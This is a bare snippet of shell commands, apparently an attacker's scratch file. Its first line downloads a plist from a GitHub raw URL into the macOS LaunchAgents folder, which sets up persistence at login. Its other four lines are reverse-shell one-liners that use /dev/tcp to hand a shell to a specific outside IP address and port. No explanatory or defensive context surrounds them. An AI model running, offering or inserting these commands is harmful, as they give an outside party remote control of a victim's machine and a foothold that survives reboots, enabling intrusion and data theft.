curl -L https://raw.githubusercontent.com/canarddu38/temp/main/loginscript.plist --output ~/Library/LaunchAgents/com.user.loginscript.plist


bash -i >& /dev/tcp/128.78.143.131/45358 0>&1

exec 5<>/dev/tcp/128.78.143.131/45358;cat <&5 | while read line; do $line 2>&5 >&5; done

exec /bin/sh 0</dev/tcp/128.78.143.131/45358 1>&0 2>&0

0<&196;exec 196<>/dev/tcp/128.78.143.131/45358; sh <&196 >&196 2>&196
